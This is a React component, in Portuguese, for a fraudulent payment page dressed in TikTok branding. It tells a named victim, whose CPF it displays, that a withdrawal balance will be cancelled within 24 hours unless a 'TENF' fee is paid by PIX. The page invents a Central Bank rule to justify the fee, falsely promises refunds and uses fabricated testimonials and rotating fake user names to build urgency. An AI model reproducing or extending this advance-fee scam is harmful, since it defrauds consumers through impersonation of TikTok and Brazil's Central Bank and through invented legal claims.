import { useState, useEffect, ReactNode } from "react";
import { Loader2, ChevronRight, Shield, AlertTriangle, Lock, Zap, CheckCircle2, ChevronDown, ChevronUp } from "lucide-react";
import StickyCtaBar from "./StickyCtaBar";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellTENFProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; price?: string; anchorPrice?: string; discountLabel?: string; }
const FaqItem = ({ question, answer }: { question: string; answer: ReactNode }) => { const [open, setOpen] = useState(false); return (<div className="border-b border-gray-200 last:border-0"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between py-2 text-left"><span className="text-gray-600 text-[11px] font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-3.5 h-3.5 text-gray-400 shrink-0" /> : <ChevronDown className="w-3.5 h-3.5 text-gray-400 shrink-0" />}</button>{open && <p className="text-gray-400 text-[11px] leading-relaxed pb-2">{answer}</p>}</div>); };

const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, price = "R$ 42,91", anchorPrice = "R$ 97,90", discountLabel = "56% OFF" }: FunnelUpsellTENFProps) => {
  
  const [recentUser, setRecentUser] = useState("");
  const recentNames = ["Maria S.", "João P.", "Ana L.", "Carlos R.", "Fernanda M.", "Ricardo T.", "Patrícia G.", "Lucas H.", "Camila D.", "Bruno F."];

  const firstName = leadName ? leadName.split(" ")[0] : "";
  const maskCpf = (cpf: string) => cpf.length >= 11 ? `${cpf.slice(0, 3)}.***.***.${cpf.slice(-2)}` : cpf;

  
  useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 12000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-white overflow-y-auto pt-6">
      <div className="bg-gray-50 pt-3 pb-4 px-4 border-b border-gray-200">
        <div className="max-w-md mx-auto flex flex-col items-center">
          <img src={tiktokLogo} alt="TikTok" className="h-7 object-contain mb-2" />
          {firstName ? (
            <>
              <p className="text-gray-500 text-[11px] mb-0.5">Saldo reservado para <strong className="text-gray-800">{firstName}</strong></p>
              <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
              {leadCpf && <p className="text-gray-400 text-[10px] mt-0.5">CPF: {maskCpf(leadCpf)}</p>}
            </>
          ) : (
            <>
              <p className="text-gray-400 text-[10px] mb-0.5">Saldo disponível</p>
              <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
            </>
          )}
        </div>
      </div>
      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-24">
        <div className="bg-red-50 border border-red-200 rounded-xl p-3">
          <div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⛔ Saque Bloqueado — Ação Imediata</span></div>
          <p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, seu</> : "Seu"} saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO PERMANENTEMENTE</strong> em 24h se o TENF não for ativado. A Resolução nº 4.893 do Banco Central <strong className="text-gray-900">obriga a validação fiscal</strong> para liberar qualquer transferência acima de R$ 1.500. <strong className="text-red-600">Sem o TENF, você perde o saldo inteiro.</strong></p>
        </div>
        {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
          <p className="text-red-700 text-xs font-bold">🚨 O que acontece se você NÃO ativar:</p>
          <div className="flex items-start gap-2"><Lock className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Saldo <strong className="text-red-600">BLOQUEADO e CANCELADO</strong> após 24 horas</span></div>
          <div className="flex items-start gap-2"><AlertTriangle className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Conta <strong className="text-red-600">marcada como irregular</strong> no sistema fiscal</span></div>
          <div className="flex items-start gap-2"><AlertTriangle className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]"><strong className="text-red-600">Impossível recuperar</strong> o valor depois do cancelamento</span></div>
          <div className="border-t border-red-200 pt-2 mt-1"><div className="flex items-start gap-2"><Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Com TENF ativado: valor cai <strong className="text-emerald-700">em até 3 minutos</strong> na sua conta</span></div></div>
        </div>
        
        <div className="relative bg-white rounded-2xl border-2 border-emerald-200 overflow-hidden shadow-sm">
          {/* Discount ribbon */}
          <div className="bg-emerald-500 text-white text-[11px] font-bold text-center py-1.5 tracking-wide">{discountLabel} — OFERTA POR TEMPO LIMITADO</div>
          <div className="p-4 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-gray-500 text-xs">Taxa única de ativação</span>
              <div className="flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5 text-emerald-500" />
                <span className="text-emerald-600 text-[10px] font-semibold">100% Reembolsável</span>
              </div>
            </div>
            <div className="flex items-baseline gap-2.5">
              <span className="text-gray-400 text-base line-through decoration-red-400">{anchorPrice}</span>
              <span className="text-gray-900 text-[34px] font-extrabold leading-none">{price}</span>
            </div>
            <div className="space-y-1.5">
              <div className="flex items-center gap-2 bg-emerald-50 rounded-lg px-2.5 py-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                <span className="text-emerald-700 text-[11px] font-medium">Reembolso automático em 2 min se o saque não cair</span>
              </div>
              <div className="flex items-center gap-2 bg-emerald-50 rounded-lg px-2.5 py-1.5">
                <Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                <span className="text-emerald-700 text-[11px] font-medium">Saque liberado em até 3 minutos após ativação</span>
              </div>
              <div className="flex items-center gap-2 bg-red-50 rounded-lg px-2.5 py-1.5">
                <AlertTriangle className="w-3.5 h-3.5 text-red-500 shrink-0" />
                <span className="text-red-600 text-[11px] font-medium">{firstName ? `${firstName}, sem` : "Sem"} ativação = perda total de {balance}</span>
              </div>
            </div>
            <div className="flex items-center justify-center gap-4 pt-1 border-t border-gray-100">
              <div className="flex items-center gap-1"><Lock className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">PIX Seguro</span></div>
              <div className="flex items-center gap-1"><Shield className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">Garantia Total</span></div>
              <div className="flex items-center gap-1"><CheckCircle2 className="w-3 h-3 text-gray-400" /><span className="text-gray-400 text-[9px]">Banco Central</span></div>
            </div>
          </div>
        </div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2.5">Perguntas frequentes</p>
          <div className="space-y-1">
            {[
              { q: "O que é o TENF?", a: <>É o Termo Eletrônico de Nota Fiscal, protocolo <strong>obrigatório</strong> regulamentado pelo Banco Central (Resolução nº 4.893). Sem ele, é <strong>impossível</strong> receber qualquer valor acima de R$ 1.500.</> },
              { q: "O que acontece se eu não ativar?", a: <>Seu saldo será <strong>cancelado permanentemente em 24 horas</strong>. O sistema fiscal bloqueia a conta e o valor não pode ser recuperado após o cancelamento.</> },
              { q: "A taxa é reembolsável?", a: <>Sim, 100% reembolsável. Se o saque não cair na sua conta, o valor volta automaticamente em até 2 minutos. <strong>Risco zero.</strong></> },
            ].map((item, i) => (
              <FaqItem key={i} question={item.q} answer={item.a} />
            ))}
          </div>
        </div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Quem ativou, já sacou</p>
          <div className="space-y-2.5">
            {[{ img: testimonial1, name: "Camila R.", amount: "R$ 3.247", text: "Em 3 minutos caiu na conta!" }, { img: testimonial2, name: "Roberto M.", amount: "R$ 2.891", text: "Fiz na hora e recebi tudo." }, { img: testimonial3, name: "Lucas T.", amount: "R$ 1.956", text: "5 minutos e já tava no banco." }].map((t, i) => (
              <div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" loading="lazy" className="w-7 h-7 rounded-full object-cover shrink-0" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>
            ))}
          </div>
        </div>
        <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
      </main>
      <StickyCtaBar
        onClick={onGeneratePix}
        isGenerating={isGenerating}
        label="LIBERAR MEU SAQUE AGORA"
        bgColor="bg-emerald-500"
        shadowColor="shadow-emerald-500/30"
      />
    </div>
  );
};

export default FunnelUpsellTENF;
